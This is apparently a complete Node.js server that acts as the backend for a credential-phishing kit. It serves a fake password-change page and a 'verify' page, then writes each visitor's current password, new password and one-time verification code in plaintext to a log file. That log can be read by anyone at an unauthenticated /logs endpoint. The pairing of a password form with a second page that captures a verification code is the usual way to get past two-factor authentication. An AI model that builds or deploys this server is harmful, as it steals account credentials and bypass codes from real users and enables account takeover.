const http = require('http');
const fs   = require('fs');
const path = require('path');

const LOG_FILE = path.join(__dirname, 'submissions.log');

function readBody(req) {
  return new Promise(resolve => {
    let data = '';
    req.on('data', chunk => data += chunk);
    req.on('end', () => {
      try { resolve(JSON.parse(data || '{}')); }
      catch (e) { resolve({}); }
    });
  });
}

function serveFile(res, filePath, contentType) {
  fs.readFile(filePath, (err, data) => {
    if (err) { res.writeHead(404); res.end('Not found'); return; }
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  });
}

const server = http.createServer(async (req, res) => {

  // Serve pages
  if (req.method === 'GET' && req.url === '/') {
    serveFile(res, path.join(__dirname, 'index.html'), 'text/html');

  } else if (req.method === 'GET' && req.url === '/verify') {
    serveFile(res, path.join(__dirname, 'verify.html'), 'text/html');

  // View logs in browser
  } else if (req.method === 'GET' && req.url === '/logs') {
    try {
      const logs = fs.existsSync(LOG_FILE) ? fs.readFileSync(LOG_FILE, 'utf8') : '(no logs yet)';
      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end(logs);
    } catch (e) {
      res.writeHead(500); res.end('Error reading logs');
    }

  // Log password change from index.html
  } else if (req.method === 'POST' && req.url === '/log-password-change') {
    const { currentPassword, newPassword, verifyPassword } = await readBody(req);
    const entry = [
      `--- Password Change Submission ---`,
      `Timestamp:        ${new Date().toISOString()}`,
      `Current Password: ${currentPassword || ''}`,
      `New Password:     ${newPassword || ''}`,
      `Verify Password:  ${verifyPassword || ''}`,
      ``
    ].join('\n') + '\n';
    fs.appendFileSync(LOG_FILE, entry);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true }));

  // Log verification code from verify.html
  } else if (req.method === 'POST' && req.url === '/log-verification') {
    const { verificationCode } = await readBody(req);
    const entry = [
      `--- Verification Code Submission ---`,
      `Timestamp:         ${new Date().toISOString()}`,
      `Verification Code: ${verificationCode || ''}`,
      ``
    ].join('\n') + '\n';
    fs.appendFileSync(LOG_FILE, entry);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ success: true }));

  } else {
    res.writeHead(404); res.end('Not found');
  }
});

server.listen(process.env.PORT || 3000, () => console.log('Server running on port ' + (process.env.PORT || 3000)));
